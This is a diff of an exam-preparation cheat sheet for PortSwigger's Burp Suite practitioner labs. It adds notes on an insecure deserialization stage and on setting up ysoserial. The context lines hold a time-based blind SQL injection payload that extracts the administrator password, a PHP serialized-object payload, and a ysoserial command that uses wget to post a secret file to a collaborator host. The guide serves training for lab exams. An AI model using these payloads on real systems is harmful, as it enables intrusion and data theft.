@@ -1615,6 +1615,8 @@ csrf=TOKEN&username=administrator
 ;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--
 ```  
 
+>Stage 3 of the Burp Practice exam admin portal require exploitation of an [insecure deserialization](#ysoserial) cookie value.  
+
 ### Blind SQLi  
 
 >Target is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie.  Below is combination of SQL injection and XXE payload to exploit the vulnerability and send administrator password as DNS request to the collaborator service.  
@@ -2829,7 +2831,13 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secret'
 ```  
 
-![ysoserial-rce](images/ysoserial-rce.png)  
+>Image below is from the Practice exam, I have some issues with my setup as the old version of java is needed when running `ysoserial` in bash terminal, and the Burp Suite Pro app need `sudo` to save the config of the extension.  
+
+![ysoserial rce](images/ysoserial-rce.png)  
+
+>Burp Deserialization Scanner configuration when running burp as sudo, leaving the java path to `java` and the ysoserial path to ``. My scanner detect the java deserialization in the burp issue list but not when i run it manual???  
+
+![Deserialization scanner config setup](images/Deserialization-scanner-config.png)  
 
 ### YsoSerial  
 
